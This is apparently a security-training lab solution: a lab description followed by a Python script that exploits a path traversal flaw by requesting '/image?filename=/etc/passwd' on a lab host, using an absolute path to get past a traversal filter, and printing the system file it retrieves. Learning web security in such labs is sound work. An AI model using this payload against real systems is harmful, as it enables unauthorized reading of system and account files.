# File path traversal, traversal sequences blocked with absolute path bypass
> This lab contains a path traversal vulnerability in the display of product images.
> The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory.
> To solve the lab, retrieve the contents of the `/etc/passwd` file.

```python
import requests

# --- Configuration ---
# Lab: File path traversal, traversal sequences blocked with absolute path bypass
# Replace with your specific lab ID
BASE_URL = "https://0a5a007b032b43c3828ae7db00d40003.web-security-academy.net"

def exploit_absolute_path(base_url):
    """
    Exploits path traversal by using an absolute path (/etc/passwd)
    to bypass relative path filters.
    """
    # Target Endpoint
    # We use the full absolute path directly as the filename
    target_url = base_url + "/image?filename=/etc/passwd"
    
    print(f"[*] Sending payload to: {target_url}")
    
    # Send GET request
    response = requests.get(target_url)
    
    # Verify and print output
    if "root:x:0:0" in response.text:
        print("[+] Success! /etc/passwd retrieved:\n")
        print(response.text)
    else:
        print("[-] Exploit failed.")

if __name__ == "__main__":
    exploit_absolute_path(BASE_URL)
```
